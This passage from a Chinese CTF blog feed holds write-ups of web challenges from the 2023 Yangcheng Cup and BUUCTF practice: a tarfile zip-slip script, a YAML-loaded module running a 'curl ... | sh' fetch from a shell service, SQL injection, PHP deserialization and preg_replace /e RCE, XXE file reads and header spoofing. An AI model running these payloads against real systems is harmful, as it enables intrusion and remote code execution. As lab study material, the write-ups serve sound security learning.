class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;GET&#x27;</span>:        <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/&#x27;</span>)    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:        upFile = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]        <span class="hljs-built_in">print</span>(upFile)        <span class="hljs-comment"># 检查文件名是否包含恶意字符，如 &quot;..&quot; 或 &quot;/&quot;</span>        <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&quot;\.\.|/&quot;</span>, upFile.filename, re.M|re.I) != <span class="hljs-literal">None</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot;</span>        savePath = <span class="hljs-string">f&quot;uploads/<span class="hljs-subst">&#123;upFile.filename&#125;</span>&quot;</span>        <span class="hljs-built_in">print</span>(savePath)        upFile.save(savePath)        <span class="hljs-comment"># 检查上传的文件是否为 tar 文件，如果是，则解压文件并获取其中的文件列表</span>        <span class="hljs-keyword">if</span> tarfile.is_tarfile(savePath):            zipDatas = extractFile(savePath, <span class="hljs-string">&#x27;tar&#x27;</span>)            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;result.html&#x27;</span>, path=savePath, files=zipDatas)        <span class="hljs-keyword">else</span>:            <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">&#123;upFile.filename&#125;</span> upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;</span><span class="hljs-comment"># 定义查看源代码的路由和视图函数</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/src&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">src</span>():    <span class="hljs-keyword">if</span> request.args:        username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&#x27;config/<span class="hljs-subst">&#123;username&#125;</span>.yaml&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:            Config = yaml.load(f.read())            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, username=<span class="hljs-string">&quot;admin&quot;</span>, message=<span class="hljs-string">&quot;success&quot;</span>)    <span class="hljs-keyword">else</span>:        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<span class="hljs-comment"># 启动 Flask 应用，监听在 0.0.0.0:8000</span><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">8000</span>)</code></pre></div><p>虽然过滤了<code>..</code>或<code>/</code></p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">tarfile</span>文件覆盖漏洞（CVE-<span class="hljs-number">2007</span>-<span class="hljs-number">4559</span>）<span class="hljs-attribute">Python</span> 中 tarfile 模块中的extract、extractFile和extractall 函数中的目录遍历漏洞 允许 用户协助的远程攻击者通过 TAR 存档文件名中的..和/遍历目录 和 写入/覆盖任意文件</code></pre></div><p>tar的zipslip文件覆盖</p><div class="code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> os<span class="hljs-keyword">import</span> tarfiledef zipslip(tarinfo):    tarinfo.uid = tarinfo.gid = <span class="hljs-number">1000</span>    tarinfo.uname = tarinfo.gname = &quot;poc&quot;    <span class="hljs-keyword">return</span> tarinfotar = tarfile.<span class="hljs-keyword">open</span>(&quot;poc.tar&quot;,&quot;w|&quot;)fullpath = os.path.<span class="hljs-keyword">join</span>(&quot;../../&quot;,&quot;config/1.yaml&quot;)tar.<span class="hljs-keyword">add</span>(fullpath,<span class="hljs-keyword">filter</span>=zipslip)tar.<span class="hljs-keyword">close</span>()</code></pre></div><p><img src="/../images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231123230342769.png" alt="image-20231123230342769"></p><p>apply不是在黑名单里面吗?</p><p><img src="/../images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2023/image-20231123230616462.png" alt="image-20231123230616462"></p><p>另一种做法是上传文件</p><div class="code-wrapper"><pre><code class="hljs erlang-repl">!!python/module:uploads.<span class="hljs-number">17</span>.py</code></pre></div><p>17.py文件内容</p><div class="code-wrapper"><pre><code class="hljs moonscript"><span class="hljs-keyword">import</span> <span class="hljs-built_in">os</span><span class="hljs-built_in">os</span>.system(<span class="hljs-string">&#x27;curl https://your-shell.com/120.46.41.173:9023 |sh&#x27;</span>)</code></pre></div><h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://blog.csdn.net/Jayjay___/article/details/132646048">2023年“羊城杯”网络安全大赛 Web方向题解wp 全_羊城杯wp-CSDN博客</a></p><p><a href="https://boogipop.com/2023/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20Writeup/">https://boogipop.com/2023/09/05/%E7%BE%8A%E5%9F%8E%E6%9D%AF%202023%20Writeup/</a></p><p><a href="https://z1d10t.fun/post/3edff1a9.html">2023羊城杯WEB WP与复现学习 | Z1d10tのBlog</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Buu刷题</title>
    <link href="/2023/09/08/Buu%E5%88%B7%E9%A2%98/"/>
    <url>/2023/09/08/Buu%E5%88%B7%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>注册个用户后，点开发现url，<code>no=1</code>，<code>’</code>尝试报错，成功报错，于是SQL注入</p><p>本来想着读username、passwd去登陆，但没什么用，读data发现反序列化数据</p><p>。。。然后就不会了</p><p>看WP，robots.txt有提示，下载源码，虽然有isValidBlog，但其实没什么用</p><p>直接序列化ssrf的数据</p><p>然后union all select 1,2,3,4，放入第四个位置（对应blog，能够反序列化的地方）</p><div class="code-wrapper"><pre><code class="hljs ada">?no=-<span class="hljs-number">1</span> union <span class="hljs-keyword">all</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-symbol">&#x27;O</span>:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;UserInfo&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;name&quot;</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;1&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;age&quot;</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;blog&quot;</span>;s:<span class="hljs-number">29</span>:<span class="hljs-string">&quot;file:///var/www/html/flag.php&quot;</span>;&#125;&#x27;</code></pre></div><h2 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h2><p>放入burp中，等一会就会截取到</p><p>发现两个参数，修改func，会发现回调函数报错，尝试system,报错hacker</p><div class="code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">func</span>=readfile&amp;p=index。php</code></pre></div><p>读取index.php，发现禁用的函数名，并且有</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;     <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;     <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;         <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;             <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);         &#125;     &#125; &#125; <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>]; <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>]; <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;     <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;         <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);     &#125;<span class="hljs-keyword">else</span> &#123;         <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);     &#125; &#125; <span class="hljs-meta">?&gt;</span></code></pre></div><p>然后不会了，。。。。。</p><p>看WP，使用unserialize()，并自行构造发序列化数据</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;     <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;ls&quot;</span>;     <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;system&quot;</span>;     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;         <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;             <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);         &#125; &#125; <span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>(); <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);</code></pre></div><p>但找不到flag</p><p>构造<code>find / -name flag</code></p><p>找到flag，然后读取即可</p><h2 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h2><p>点开按钮，查看url，可能存在任意文件读取，尝试index.php，不行，加个php:&#x2F;&#x2F;filter过滤器</p><p>成功读取，关键代码<code>include($_GET[’category‘].&#39;php&#39;)</code></p><p>只有三个文件可利用，于是想到<code>filterchain</code></p><p><img src="/2023/09/08/Buu%E5%88%B7%E9%A2%98/image-20230908114051163.png" alt="image-20230908114051163"></p><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><p>先data:&#x2F;&#x2F;伪协议满足判断，然后读取next.php，回显输入的内容，感觉不对，加个php:&#x2F;&#x2F;filter伪协议，成功读取，</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,        <span class="hljs-variable">$str</span>    );&#125;<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>). <span class="hljs-string">&quot;\n&quot;</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFlag</span>(<span class="hljs-params"></span>)</span>&#123;@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);&#125;</code></pre></div><p>一眼preg_replace的&#x2F;e，存在漏洞，<code>strtolower(&quot;\\1&quot;)</code>的意思自行查找</p><p>要在next.php下加参数</p><div class="code-wrapper"><pre><code class="hljs bash">/next.php?\S*=&#123;<span class="hljs-variable">$&#123;getFlag()&#125;</span>&#125;&amp;cmd=system(<span class="hljs-string">&#x27;cat%20/flag&#x27;</span>);</code></pre></div><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>一看就要套娃</p><p>进去找不到文件。。。。。</p><p>小看一眼WP，<code>.git</code>泄露</p><p>代码审计一看就是无参数RCE</p><p>列目录</p><div class="code-wrapper"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">var_dump</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())));</span></code></pre></div><p>flag.php在倒数第二个</p><div class="code-wrapper"><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">highlight_file</span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">current</span>(<span class="hljs-title">localeconv</span>())))));</span></code></pre></div><h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p>登陆界面抓包，很明显，直接XXE</p><p>尝试直接读取<code>/flag</code>，成功</p><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">TEST</span> [</span><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/flag&quot;</span>&gt;</span>]&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span></code></pre></div><h2 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h2><p>遇到这种题就头大，但是这考的比较简单</p><p>是一个网页，点什么都没用，在最后面发现输出了dog，感觉有点问题，但是找不到文件</p><p>小看一眼wp，又是<code>.git</code>泄露，但好像说不稳定，要多试几次</p><div class="code-wrapper"><pre><code class="hljs awk">&lt;?phpinclude <span class="hljs-string">&#x27;flag.php&#x27;</span>;<span class="hljs-variable">$yds</span> = <span class="hljs-string">&quot;dog&quot;</span>;<span class="hljs-variable">$is</span> = <span class="hljs-string">&quot;cat&quot;</span>;<span class="hljs-variable">$handsome</span> = <span class="hljs-string">&#x27;yds&#x27;</span>;foreach(<span class="hljs-variable">$_POST</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　　    $<span class="hljs-variable">$x</span> = <span class="hljs-variable">$y</span>  ;  <span class="hljs-regexp">//</span>post 声明至当前文件&#125;foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;　　　     $<span class="hljs-variable">$x</span> = $<span class="hljs-variable">$y</span>;  <span class="hljs-regexp">//</span>GET型变量重新赋值为当前文件变量中以其值为键名的值&#125;foreach(<span class="hljs-variable">$_GET</span> as <span class="hljs-variable">$x</span> =&gt; <span class="hljs-variable">$y</span>)&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-variable">$x</span> &amp;&amp; <span class="hljs-variable">$x</span> !== <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;　 <span class="hljs-regexp">//</span>传入的变量为flag   value不是flag        <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$handsome</span>);    &#125;&#125;<span class="hljs-keyword">if</span>(!isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]) &amp;&amp; !isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]))&#123;      <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$yds</span>);&#125;<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>  || <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>] === <span class="hljs-string">&#x27;flag&#x27;</span>)&#123;       <span class="hljs-keyword">exit</span>(<span class="hljs-variable">$is</span>);&#125;echo <span class="hljs-string">&quot;the flag is: &quot;</span>.<span class="hljs-variable">$flag</span>;</code></pre></div><p>明显的变量覆盖，想着能不能到最后echo输出，但发现好像不行，只好利用exit</p><p>有三种方法（网上直接抄了）</p><div class="code-wrapper"><pre><code class="hljs routeros">?<span class="hljs-attribute">yds</span>=flag  ?<span class="hljs-attribute">is</span>=flag&amp;flag=flag?<span class="hljs-attribute">handsome</span>=flag&amp;flag=x&amp;x=flag</code></pre></div><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>hint提示看cookie</p><p>flag.php 输出什么回显什么，猜测ssti</p><p>查看后端是php</p><p>经过尝试后是twig（自己sbb的存的payload忘记怎么用了，看了wp才反应过来）</p><p>然后成功命令执行</p><p>但是发现回显只有一个，就当我困惑时，尝试了<code>cat /etc/passwd</code> 是<code>nginx</code>，而我们的用户是<code>www-data</code> ，所以知道只是输出受限制了</p><p>但我思路仍然受阻，看了眼WP，<code>cat /flag</code> 。。。。。。。。。。。。</p><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>看url，有img和cmd，cmd禁用很多，从img入手，把编码拿到cyberchef，直接还原（看别人也有解不出来这个的）</p><p>我在编码时也被坑了一下，base64换了一个符号，hex要调为None</p><p>然后自然猜测flag.php(然后跳转，没什么用)，也试过其他后缀，都是跳转同一个地方，大概猜出有个正则匹配</p><p>其实没有东西读的时候，就读index.php，（因为看是图片，我sbb的构造index.png……….）</p><p>然后读出源码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]))     <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;img&#x27;</span>])));<span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span>);<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/flag/i&quot;</span>, <span class="hljs-variable">$file</span>)) &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;xixiï½ no flag&quot;</span>);&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-variable">$txt</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>));    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="hljs-variable">$txt</span> . <span class="hljs-string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$cmd</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="hljs-variable">$cmd</span>)) &#123;    <span class="hljs-keyword">echo</span>(<span class="hljs-string">&quot;forbid ~&quot;</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);    &#125;&#125;<span class="hljs-meta">?&gt;</span>&lt;html&gt;&lt;style&gt;  body&#123;   background:<span class="hljs-title function_ invoke__">url</span>(./bj.png)  no-repeat center center;   background-size:cover;   background-attachment:fixed;   background-color:<span class="hljs-comment">#CCCCCC;</span>&#125;&lt;/style&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code></pre></div><h2 id="string-POST-‘a’-string-POST-‘b’-md5-POST-‘a’-md5-POST-‘b’"><a href="#string-POST-‘a’-string-POST-‘b’-md5-POST-‘a’-md5-POST-‘b’" class="headerlink" title="(string)$POST[‘a’] !&#x3D;&#x3D; (string)$POST[‘b’] &amp;&amp; md5($POST[‘a’]) &#x3D;&#x3D;&#x3D; md5($POST[‘b’])"></a>(string)$POST[‘a’] !&#x3D;&#x3D; (string)$POST[‘b’] &amp;&amp; md5($POST[‘a’]) &#x3D;&#x3D;&#x3D; md5($POST[‘b’])</h2><p>猜的八九不离十，关键是</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;        <span class="hljs-keyword">echo</span> `<span class="hljs-variable">$cmd</span>`;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);    &#125;&#125;</code></pre></div><p>我把数组和MD5碰撞都试了，发现没用。。。。</p><p>看了wp，没错啊是md5碰撞，重新开网页测试，成功了。。。。。。。。。。。</p><h1 id="BUU-BURP-COURSE-1"><a href="#BUU-BURP-COURSE-1" class="headerlink" title="BUU BURP COURSE 1"></a>BUU BURP COURSE 1</h1><div class="code-wrapper"><pre><code class="hljs">只允许本地访问</code></pre></div><p>考察HTTP请求头</p><p>X-Forwarded-For      Client-Ip     X-Real-IP</p><p>这里要使用X-Real-IP</p><p>，然后是个登录框，使用post请求带上参数即可</p><h2 id="X-Forwarded-For与X-Real-IP区别"><a href="#X-Forwarded-For与X-Real-IP区别" class="headerlink" title="X-Forwarded-For与X-Real-IP区别"></a>X-Forwarded-For与X-Real-IP区别</h2><p>X-Forwarded-For能记录完整的多级代理</p><p>X-Real-IP只有一个值</p><p>所以 ，如果只有一层代理，这两个头的值就是一样的</p><p>多级代理很少见，只有一级代理的情况下二者是等效的</p><p>如果有多级代理，x-forwarded-for效果是大于x-real-ip的，可以记录完整的代理链路</p><div class="code-wrapper"><pre><code class="hljs cobol">来自`4.4.4.4`的一个请求，header包含这样一行X-Forwarded-For: 1.1.1.1, 2.2.2.2, 3.3.3.3      代表 请求由`1.1.1.1`发出，经过三层代理，第一层是`2.2.2.2`，第二层是`3.3.3.3`，而本次请求的来源IP`4.4.4.4`是第三层代理</code></pre></div><div class="code-wrapper"><pre><code class="hljs csharp">而`X-Real-IP`，没有相关标准，上面的例子，如果配置了`X-Read-IP`，可能会有两种情况<span class="hljs-comment">// 最后一跳是正向代理，可能会保留真实客户端IP</span>X-Real-IP: <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-comment">// 最后一跳是反向代理，比如Nginx，一般会是与之直接连接的客户端IP X-Real-IP: 3.3.3.3</span>    如果用户访问你的 nginx反向代理之前，还经过了一层正向代理，你即使在nginx中配置了x-real-ip，取到的也只是正向代理的IP而不是客户端真实IP</code></pre></div>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>disable_function</title>
    <link href="/2023/09/06/disable-function/"/>
    <url>/2023/09/06/disable-function/</url>
    
    <content type="html"><![CDATA[<h1 id="disable-function与open-basedir"><a href="#disable-function与open-basedir" class="headerlink" title="disable_function与open_basedir"></a>disable_function与open_basedir</h1><p>这两个一直不知道是什么，今天我们来了解一下，并看看他们的bypass</p><h2 id="disable-function"><a href="#disable-function" class="headerlink" title="disable_function"></a>disable_function</h2><p>disable_function是php.ini的一个设置选项，可以用来设置php环境禁止使用某些函数，</p><p>（eval在php中不属于函数，因此disable_function对它不起作用）</p><h1 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h1><p><a href="https://ph0ebus.cn/post/%E7%AA%81%E7%A0%B4disable_functions%E9%99%90%E5%88%B6%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4.html">突破disable_function限制执行命令 · ph0ebus’s Blog</a></p><p>这位师傅也是很厉害的（最近看到师傅新文章中挺多都是我计划要学的，嘻嘻），文章也写很好</p><h2 id="利用LD-PRELOAD环境变量"><a href="#利用LD-PRELOAD环境变量" class="headerlink" 